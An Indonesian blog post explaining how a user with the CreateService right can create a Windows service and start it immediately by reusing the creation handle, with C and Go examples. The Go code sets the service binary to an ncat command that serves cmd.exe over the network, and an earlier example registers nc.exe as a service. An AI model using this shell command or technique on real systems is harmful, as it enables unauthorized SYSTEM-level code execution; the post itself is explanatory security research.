Windows Services: Start a Service During Its Creation

Tahun lalu (ternyata udah setahun), saya sempat baca dua buah postingan blog yang membahas soal Windows Service (selanjutkan akan disebut Service). Post pertama merupakan bagian dari seri “beyond root”-nya 0xdf, bisa dibaca disini. Sedangkan post kedua adalah post dari VbScrub, bisa di baca disini. Di post pertama, sebenarnya 0xdf ngulik soal psexec-nya Impacket, tapi masih terkait dengan Service. Hubungan post pertama dengan post kedua adalah si VbScrub melanjutkan kulikan-nya 0xdf dan membahas lebih detail tentang Service-nya.

Berkat kedua postingan tersebut, jadi mulai lihat-lihat dokumentasi API Windows tentang Service.

*Ngulik itu sebangsa ngoprek üòÖ

Pada Windows, Service sendiri adalah sebutan suatu program yang berjalan di belakang layar. Untuk Linux/Unix-like, sebutannya adalah Daemon. Contohnya: Windows Update, Firewall, Audio processing seperti Realtek misalnya, dll.

Creation of a Service#

Sebelum melanjutkan tentang kedua postingan tadi, ada baiknya kita tahu dulu cara membuat sebuah Service dan bagaimana prosesnya di belakang layar.

Windows menyediakan sebuah command-line utility bernama sc.exe untuk mengelola hal-hal terkait Service. Kita bisa menggunakan utility tersebut untuk membuat sebuah Service, misalnya:

$ sc.exe create MyService binPath="C:\program.exe"
  • MyService = Nama service
  • binPath = Lokasi executable program (+ argument)

Kedua argumen diatas wajib disuplai.

Pembuatan service akan berhasil jika perintah tersebut diketikkan pada elevated (admin) terminal (cmd), atau si user memiliki hak CreateService (diizinkan untuk membuat Service).

C:\Users\fahmi>sc create MyService binPath="C:\myservice\nc.exe"
[SC] CreateService SUCCESS

Jika bukan eleveated atau tanpa hak untuk membuat Service, maka hasilnya:

C:\Users\fahmi>sc.exe create MyService binPath="C:\myservice\nc.exe"
[SC] OpenSCManager FAILED 5:

Access is denied.

Untuk mengetahui proses pembuatan service dibelakang layar, kita bisa mengacu ke kode dalam bahasa C pada dokumentasi Microsoft. Secara garis besar, proses pembuatan Service adalah seperti berikut:

  1. Program membuat koneksi ke Service Control Manager (SCM) dengan memanggil fungsi OpenSCManager. Fungsi ini mengembalikan (return value) sesuatu yang disebut handle (selanjutnya kita sebut handle SCM) dengan level akses tertentu, detailnya bisa dilihat disini.
    • Jika mode elevated, maka akses handlenya adalah SC_MANAGER_ALL_ACCESS (berdasarkan dokumentasi)
    • Jika hak CreateService, maka akses handlenya adalah SC_MANAGER_CREATE_SERVICE (berdasarkan post VbScrub)
    • Jika tidak keduanya, maka pesan galat OpenSCManager FAILED ditampilkan dan program langsung keluar.
  2. Handle SCM bersama dengan argumen “nama service” dan “binPath” akan disuplai ke fungsi CreateService untuk membuat service. Fungsi CreateService ini punya nilai kembali berupa handle (kita sebut handle SVC) dengan level akses tertentu juga, detailnya bisa dilihat disini.
    • Disini user dengan hak CreateService bisa menentukan level akses handle SVC.
  3. Di tahap ini, pesan sukses ditampilkan, lalu handle SCM dan handle SVC ditutup dan program keluar.

Sekarang kita beralih ke kontrolnya.

Service Control#

Secara default, normal user tidak punya akses untuk membuat Service apalagi mengontrol (Start, Stop, Config) suatu service.

C:\Users\fahmi>sc start myService
[SC] StartService: OpenService FAILED 5:

Access is denied.

Kita ambil contoh dari sisi user pada saat menjalankan sebuah service, prosesnya secara garis besar adalah seperti berikut:

  1. Membuat koneksi ke SCM database dan mendapatkan handle SCM dengan level akses tertentu
  2. Handle SCM kemudian disuplai ke fungsi OpenService. Fungsi ini mengembalikan handle SVC dengan level akses tertentu.
  3. Handle SVC lalu disuplai ke StartService untuk mulai menjalankan service.

Dari ketiga tahap dari proses menjalankan service tersebut, tentu saja normal user akan mendapatkan galat berupa “Access is denied”.

Start a Service using CreateService Service Handle#

Nah, jika melihat kembali tahap 2 dari pembuatan Service, selain admin, user dengan hak CreateService, bisa menentukan level akses dari handle SVC. Handle ini juga merefleksikan hak kontrol kita terhadap suatu service. Jadi, jika saat pembuatan Service A, level akses yang suplai adalah SERVICE_ALL_ACCESS (full kontrol), maka handle SVC A pun akan memiliki hak akses yang sama terhadap Service A.

Lalu, kira-kira apa jadinya jika suplai handle SVC A tersebut tidak ditutup seperti seharusnya, melainkan dilanjut dan disuplai ke fungsi StartService ? Hal inilah yang dilakukan oleh 0xdf dan VbScrub!

VbScrub juga menuliskan sebuah code untuk mendemonstrasikan temuannya, disini. Tapi, lebih gampangnya kita simak potongan code bahasa C untuk pembuatan/instalasi sebuah service dari Microsoft berikut.

VOID SvcInstall()
{
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    TCHAR szPath[MAX_PATH];

    if( !GetModuleFileName( "", szPath, MAX_PATH ) )
    {
        printf("Cannot install service (%d)\n", GetLastError());
        return;
    }
    
     // Creation of a Service: STEP 1
    // Get a handle to the SCM database.
    schSCManager = OpenSCManager(
        NULL,                    // local computer
        NULL,                    // ServicesActive database
        SC_MANAGER_ALL_ACCESS);  // full access rights

    if (NULL == schSCManager)
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }
     // Creation of a Service: STEP 2
    // Create the service
    schService = CreateService(
        schSCManager,              // SCM database
        SVCNAME,                   // name of service
        SVCNAME,                   // service name to display
        SERVICE_ALL_ACCESS,        // desired access
        SERVICE_WIN32_OWN_PROCESS, // service type
        SERVICE_DEMAND_START,      // start type
        SERVICE_ERROR_NORMAL,      // error control type
        szPath,                    // path to service's binary
        NULL,                      // no load ordering group
        NULL,                      // no tag identifier
        NULL,                      // no dependencies
        NULL,                      // LocalSystem account
        NULL);                     // no password

    if (schService == NULL)
    {
        printf("CreateService failed (%d)\n", GetLastError());
        CloseServiceHandle(schSCManager);
        return;
    }
    else printf("Service installed successfully\n");

    // Creation of a Service: STEP 3
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

Dan bandingkan dengan code berikut yang saya tulis dalam bahasa Go.

package main

func main() {
	// Creation of a Service: STEP 1
	// Connect to scm to get a handle to create a service
	scmHandle, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CREATE_SERVICE)
	if err != nil {
		fmt.Print("Error cannot create a service", err)
		os.Exit(-1)
	}

	// define service
	serviceName, _ := windows.UTF16PtrFromString("MyService")
	serviceExecPath, _ := windows.UTF16PtrFromString(`C:\myservicec\ncat.exe -e cmd.exe localhost 9000`)

	// Creation of a ervice: STEP 2
	// Create a service
	svcHandle, err := windows.CreateService(
		scmHandle,                         // SCM database
		serviceName,                       // name of service
		nil,                               // service name to display
		windows.SERVICE_ALL_ACCESS,        // desired access
		windows.SERVICE_WIN32_OWN_PROCESS, // service type
		windows.SERVICE_DEMAND_START,      // start type
		windows.SERVICE_ERROR_NORMAL,      // error control type
		serviceExecPath,                   // path to service's binary
		nil,                               // no load ordering group
		nil,                               // no tag identifier
		nil,                               // no dependencies
		nil,                               // LocalSystem account
		nil,                               // no password
	)
	if err != nil {
		fmt.Print("err", err)
		os.Exit(-1)
	}

	// Creation of a Service: STEP 3
	// Don't close the svcHandle, instead send it to StartService
	if windows.StartService(svcHandle, 0, nil); err != nil {
		fmt.Print("Error Starting service", err)
		os.Exit(-1)
	}
    // Creation of a Service: STEP 4
    // Finally close the handles
    windows.CloseServiceHandle(svcHandle)
    windows.CloseHandle(scmHandle)
}

Pada potongan code C tahap 3, handle SCM dan handle SVC ditutup, sedangkan pada potongan code Go, handle SVC digunakan untuk menjalankan service yang baru saja dibuat.

Jadi … ?#

Seperti di postnya, VbScrub bilang hal ini kemungkinan bukan security issue.

Tapi kalau balik lagi dan mengacu ke dokumentasi Microsoft-nya, bisa disimpulkan secara gak langsung kalau user dengan hak CreateService masih termasuk admin.

Entahlah, yang jelas disini kita butuh hak CreateService (SC_MANAGER_CREATE_SERVICE) dan custom compiled program jika tidak mau menunggu reboot, karena pembuatan service menggunakan sc.exe sudah pasti handle SVCnya ditutup. Jadi setidaknya, start up type si Service harus dibuat jadi automatic on boot.
